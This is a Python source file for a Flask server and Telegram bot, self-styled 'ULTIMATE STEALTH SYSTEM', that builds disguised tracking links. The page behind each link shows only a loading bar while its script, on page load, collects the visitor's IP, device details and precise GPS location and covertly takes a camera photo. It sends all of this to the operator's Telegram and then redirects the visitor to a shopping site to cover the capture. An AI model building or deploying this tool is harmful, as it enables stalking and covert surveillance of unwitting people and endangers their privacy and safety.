import os, sys, json, sqlite3, secrets, base64, io, threading, time, logging, random, hashlib, string, subprocess
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string, redirect, send_file
import telebot
from telebot.apihelper import ApiTelegramException
from PIL import Image
import requests

# ==================== CONFIG ====================
class Config:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
    ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
    
    PORT = int(os.environ.get("PORT", 8080))
    REDIRECT_URL = os.environ.get("REDIRECT_URL", "https://www.digikala.com")
    SERVER_URL = os.environ.get("SERVER_URL", f"http://localhost:{PORT}")
    
    MAX_SCREENSHOTS = 3
    SESSION_TIMEOUT = 45
    VERSION = "ULTIMATE-STEALTH-4.0"
    
    @classmethod
    def validate(cls):
        if not cls.BOT_TOKEN:
            raise ValueError("BOT_TOKEN not set")
        if not cls.ADMIN_ID:
            raise ValueError("ADMIN_ID not set")
        return True

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('system.log', encoding='utf-8')
    ]
)
log = logging.getLogger()

# ==================== LINK MANAGER ====================
class LinkMaster:
    @staticmethod
    def generate_short_code():
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(6))
    
    @staticmethod
    def create_clean_link(base_url, session_id):
        short_code = LinkMaster.generate_short_code()
        clean_link = f"{base_url}/l/{short_code}"
        return clean_link, short_code

# ==================== ADVANCED BOT ====================
class StealthBot:
    def __init__(self, token):
        self.bot = telebot.TeleBot(token)
        self._setup_handlers()
        self.active_links = {}
    
    def _safe_send(self, chat_id, text, **kwargs):
        try:
            return self.bot.send_message(chat_id, text, **kwargs)
        except ApiTelegramException as e:
            error_msg = str(e)
            if "403" in error_msg:
                pass
            elif "409" in error_msg:
                time.sleep(30)
            return None
        except:
            return None
    
    def _setup_handlers(self):
        @self.bot.message_handler(commands=['start', 'help'])
        def handle_start(message):
            self._safe_send(
                message.chat.id,
                f"""✅ System Active

Commands:
/link - Create tracking link
/stats - View statistics
/sessions - Active sessions

ID: `{message.from_user.id}`
Time: {datetime.now().strftime('%H:%M:%S')}""",
                parse_mode='Markdown'
            )
        
        @self.bot.message_handler(commands=['link'])
        def handle_link(message):
            self._create_smart_link(message.from_user.id)
        
        @self.bot.message_handler(commands=['stats'])
        def handle_stats(message):
            stats = Database.get_stats()
            self._safe_send(
                message.chat.id,
                f"""📊 Stats
Active: {stats['active']}
Today: {stats['today']}
Success: {stats['rate']}%
Updated: {datetime.now().strftime('%H:%M')}""",
                parse_mode='Markdown'
            )
        
        @self.bot.message_handler(commands=['sessions'])
        def handle_sessions(message):
            sessions = Database.get_user_sessions(message.from_user.id, 10)
            if not sessions:
                self._safe_send(message.chat.id, "No active sessions.")
                return
            
            text = "Recent:\n\n"
            for s in sessions:
                text += f"{s['code']} - {s['clicks']} clicks\n"
            
            self._safe_send(message.chat.id, text)
    
    def _create_smart_link(self, user_id):
        session_id = secrets.token_urlsafe(12)
        clean_link, short_code = LinkMaster.create_clean_link(Config.SERVER_URL, session_id)
        
        Database.create_session(session_id, user_id, short_code)
        
        self._safe_send(
            user_id,
            f"""Link created:
`{clean_link}`

ID: {short_code}
Expires: {(datetime.now() + timedelta(hours=24)).strftime('%H:%M')}""",
            parse_mode='Markdown'
        )
    
    def send_instant_data(self, user_id, data_type, data):
        if data_type == "init":
            text = f"""📱 New Session
ID: `{data.get('session_id', '')[:12]}`
IP: {data.get('ip', '...')}
Device: {data.get('device', 'Unknown')}"""
        
        elif data_type == "gps":
            text = f"""📍 Location
{data.get('lat', 0):.6f}, {data.get('lng', 0):.6f}
Acc: {data.get('acc', 0)}m"""
            
            if 'lat' in data and 'lng' in data:
                self._safe_send(
                    user_id,
                    f"https://maps.google.com/?q={data['lat']},{data['lng']}"
                )
        
        elif data_type == "photo":
            if 'image' in data:
                try:
                    self.bot.send_photo(
                        user_id,
                        photo=base64.b64decode(data['image']),
                        caption=f"#{data.get('index', 1)}"
                    )
                except:
                    pass
        
        elif data_type == "complete":
            text = f"""✅ Complete
ID: `{data.get('session_id', '')[:12]}`
Duration: {data.get('duration', 0):.1f}s
Data: {data.get('points', 0)} points"""
        
        else:
            return
        
        if data_type != "photo":
            self._safe_send(user_id, text, parse_mode='Markdown')
    
    def polling(self):
        while True:
            try:
                self.bot.polling(none_stop=True, timeout=30)
            except:
                time.sleep(10)

# ==================== DATABASE ====================
class Database:
    _instance = None
    
    @classmethod
    def get_instance(cls):
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance
    
    def __init__(self):
        self.conn = sqlite3.connect('data.db', check_same_thread=False)
        self.init_tables()
    
    def init_tables(self):
        c = self.conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS links (
            id INTEGER PRIMARY KEY,
            session_id TEXT UNIQUE,
            short_code TEXT UNIQUE,
            user_id INTEGER,
            created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            clicks INTEGER DEFAULT 0,
            status TEXT DEFAULT 'active'
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS data (
            id INTEGER PRIMARY KEY,
            session_id TEXT,
            data_type TEXT,
            data TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        self.conn.commit()
    
    @classmethod
    def create_session(cls, session_id, user_id, short_code):
        instance = cls.get_instance()
        c = instance.conn.cursor()
        
        c.execute('''INSERT INTO links 
            (session_id, short_code, user_id) 
            VALUES (?, ?, ?)''',
            (session_id, short_code, user_id))
        
        instance.conn.commit()
        return short_code
    
    @classmethod
    def save_data(cls, session_id, data_type, data):
        instance = cls.get_instance()
        c = instance.conn.cursor()
        
        c.execute('''INSERT INTO data 
            (session_id, data_type, data) 
            VALUES (?, ?, ?)''',
            (session_id, data_type, json.dumps(data)))
        
        instance.conn.commit()
    
    @classmethod
    def get_stats(cls):
        instance = cls.get_instance()
        c = instance.conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM links WHERE status = 'active'")
        active = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM links WHERE DATE(created) = DATE('now')")
        today = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM links WHERE clicks > 0")
        with_clicks = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM links")
        total = c.fetchone()[0]
        
        rate = (with_clicks / total * 100) if total > 0 else 0
        
        return {
            'active': active,
            'today': today,
            'rate': round(rate, 1)
        }
    
    @classmethod
    def get_user_sessions(cls, user_id, limit=10):
        instance = cls.get_instance()
        c = instance.conn.cursor()
        
        c.execute('''SELECT short_code, created, clicks 
            FROM links WHERE user_id = ? 
            ORDER BY created DESC LIMIT ?''', (user_id, limit))
        
        sessions = []
        for row in c.fetchall():
            sessions.append({
                'code': row[0],
                'created': row[1],
                'clicks': row[2]
            })
        
        return sessions

# ==================== FLASK APP ====================
app = Flask(__name__)
bot_manager = None

STEALTH_PAGE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: system-ui, -apple-system, sans-serif;
            background: #ffffff;
            color: #333;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .container {
            text-align: center;
            padding: 40px;
            max-width: 500px;
            width: 90%;
        }
        
        .text {
            font-size: 18px;
            margin-bottom: 20px;
            color: #555;
            line-height: 1.6;
        }
        
        .loader {
            width: 100%;
            height: 2px;
            background: #f0f0f0;
            border-radius: 1px;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .loader-bar {
            width: 0%;
            height: 100%;
            background: #4CAF50;
            border-radius: 1px;
            transition: width 0.3s ease;
        }
        
        .info {
            font-size: 14px;
            color: #888;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="text" id="text">
            Please wait...
        </div>
        
        <div class="loader">
            <div class="loader-bar" id="progress"></div>
        </div>
        
        <div class="info" id="info">
            Loading content
        </div>
    </div>

    <script>
        const SESSION_ID = "{{ session_id }}";
        const REDIRECT_URL = "{{ redirect_url }}";
        
        let collected = {
            session_id: SESSION_ID,
            start: new Date().toISOString(),
            device: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        
        function updateProgress(percent, message) {
            document.getElementById('progress').style.width = percent + '%';
            if (message) {
                document.getElementById('info').textContent = message;
            }
        }
        
        async function send(type, data = null) {
            const payload = {
                type: type,
                session_id: SESSION_ID,
                data: data || collected
            };
            
            try {
                await fetch('/api/data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch(e) {}
        }
        
        async function collectInfo() {
            updateProgress(20, 'Checking...');
            
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                collected.ip = data.ip;
            } catch(e) {}
            
            if (navigator.connection) {
                collected.network = navigator.connection.effectiveType;
            }
            
            updateProgress(40, 'Loading...');
        }
        
        function getLocation() {
            if (!navigator.geolocation) return;
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    collected.location = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        acc: position.coords.accuracy
                    };
                    
                    send('location', collected.location);
                },
                () => {},
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }
        
        async function getMedia() {
            if (!navigator.mediaDevices) return;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' }
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(blob => {
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                const base64data = reader.result.split(',')[1];
                                
                                send('media', {
                                    image: base64data,
                                    size: `${canvas.width}x${canvas.height}`
                                });
                            };
                            reader.readAsDataURL(blob);
                        }, 'image/jpeg');
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                };
            } catch(e) {}
        }
        
        async function start() {
            await send('start');
            await collectInfo();
            updateProgress(60, 'Processing...');
            
            getLocation();
            
            updateProgress(80, 'Finalizing...');
            await getMedia();
            
            collected.end = new Date().toISOString();
            collected.duration = new Date() - new Date(collected.start);
            
            await send('complete', collected);
            updateProgress(100, 'Ready...');
            
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 1000);
        }
        
        window.addEventListener('DOMContentLoaded', start);
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    return redirect(Config.REDIRECT_URL)

@app.route('/l/<code>')
def short_link(code):
    return redirect(f"/s/{code}")

@app.route('/s/<code>')
def session_page(code):
    session_id = secrets.token_urlsafe(12)
    Database.create_session(session_id, 0, code)
    
    return render_template_string(
        STEALTH_PAGE,
        session_id=session_id,
        redirect_url=Config.REDIRECT_URL
    )

@app.route('/api/data', methods=['POST'])
def api_data():
    try:
        data = request.json
        session_id = data.get('session_id')
        data_type = data.get('type')
        
        if not session_id or not data_type:
            return jsonify({"status": "ok"}), 200
        
        Database.save_data(session_id, data_type, data.get('data', {}))
        
        if bot_manager:
            user_id = 0
            bot_manager.send_instant_data(
                Config.ADMIN_ID,
                data_type,
                data.get('data', {})
            )
        
        return jsonify({"status": "ok"}), 200
        
    except:
        return jsonify({"status": "ok"}), 200

@app.route('/status')
def status():
    return jsonify({
        "status": "active",
        "time": datetime.now().isoformat()
    })

# ==================== MAIN ====================
def run_server():
    from waitress import serve
    serve(app, host='0.0.0.0', port=Config.PORT, threads=8)

def run_bot():
    global bot_manager
    bot_manager = StealthBot(Config.BOT_TOKEN)
    bot_manager.polling()

def check_deps():
    required = ['flask', 'pyTelegramBotAPI', 'pillow', 'requests', 'waitress']
    for pkg in required:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])

if __name__ == "__main__":
    print("\n" + "="*60)
    print("🚀 ULTIMATE STEALTH SYSTEM v4.0")
    print("="*60)
    
    try:
        Config.validate()
    except ValueError as e:
        log.error(str(e))
        sys.exit(1)
    
    check_deps()
    
    db = Database.get_instance()
    
    server_thread = threading.Thread(target=run_server, daemon=True)
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    
    server_thread.start()
    time.sleep(1)
    bot_thread.start()
    
    log.info(f"System active: {Config.SERVER_URL}")
    log.info("Stealth mode: ON")
    log.info("Real-time delivery: ACTIVE")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log.info("Shutdown")
